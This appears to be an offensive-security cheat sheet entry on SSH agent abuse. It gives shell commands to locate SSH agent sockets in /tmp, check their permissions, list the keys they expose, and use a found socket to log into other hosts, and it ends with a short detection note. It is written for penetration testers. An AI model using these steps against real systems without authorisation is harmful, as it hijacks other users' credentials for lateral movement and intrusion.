---
technique: SSH Agent Abuse
category: credentials
targets: Linux SSH Agent
protocols: SSH
remote_capable: false
tags: linux credentials ssh agent socket lateral-movement
---

# SSH Agent Abuse

SSH agent abuse uses a reachable forwarded agent socket to authenticate to other hosts without extracting the private key.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Agent socket access | Current user must read and write to the agent socket |
| Loaded key | The agent must hold a key accepted by the next target |
| SSH reachability | The next target must be reachable from the current host |

## Linux

### Agent environment

#sh #ssh #agent

Print the current SSH agent socket path.

```sh title:"Print SSH agent socket"
printenv SSH_AUTH_SOCK
```
<!-- cheat -->

### Find agent sockets

#sh #ssh #agent

Find SSH agent sockets under temporary directories.

```sh title:"Find SSH agent sockets"
find /tmp -type s -name 'agent.*' 2>/dev/null
```
<!-- cheat -->

### Check socket permissions

#sh #ssh #agent

Check permissions on a candidate SSH agent socket.

```sh title:"Check agent socket permissions"
ls -la "$agent_socket"
```
<!-- cheat
var agent_socket
-->

### List agent keys

#sh #ssh #agent

List public keys exposed by a candidate agent socket.

```sh title:"List keys from agent socket"
SSH_AUTH_SOCK="$agent_socket" ssh-add -l
```
<!-- cheat
var agent_socket
-->

### Use agent socket

#sh #ssh #agent

Connect to a target host using a candidate agent socket.

```sh title:"Connect through agent socket"
SSH_AUTH_SOCK="$agent_socket" ssh "$user@$rhost_ip"
```
<!-- cheat
var agent_socket
var user
var rhost_ip
-->

## Detection

Monitor agent forwarding, unexpected reads from agent sockets, and SSH logins that chain from intermediate hosts.
